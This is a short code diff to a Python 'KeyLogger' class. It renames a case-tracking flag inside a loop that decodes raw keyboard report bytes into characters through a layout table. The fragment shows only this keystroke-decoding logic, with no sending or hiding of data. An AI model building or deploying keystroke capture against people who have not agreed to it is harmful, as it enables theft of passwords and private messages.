@@ -57,14 +57,14 @@ class KeyLogger:
                 exit()
             if data:
                 key_code = data[2]  # The key code is in byte
-                uppercase: bool = True
+                lowercase: bool = True
                 if data[0] == 2:
-                    uppercase = False
+                    lowercase = False
                 try:
                     # ignore release the key:
                     if self.keyboard_layout[str(key_code)] == [None, None]:
                         continue
-                    offset: int = int((lambda u: u[0] if uppercase else u[1])(self.keyboard_layout[str(key_code)]))
+                    offset: int = int((lambda u: u[0] if lowercase else u[1])(self.keyboard_layout[str(key_code)]))
                     if offset is None:
                         continue
                 except KeyError:
